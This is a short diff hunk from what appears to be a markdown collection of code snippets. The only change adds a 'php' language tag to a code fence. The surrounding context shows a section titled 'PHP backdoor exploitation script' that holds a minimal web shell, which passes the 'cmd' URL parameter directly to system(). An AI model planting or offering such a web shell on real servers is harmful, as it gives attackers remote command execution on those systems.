@@ -304,7 +304,8 @@ echo "Sum: ",$z;
 ```
 
 #### PHP backdoor exploitation script
-```<?php
+```php
+<?php
 $cmd=$_GET['cmd'];
 system($cmd);
 ?>
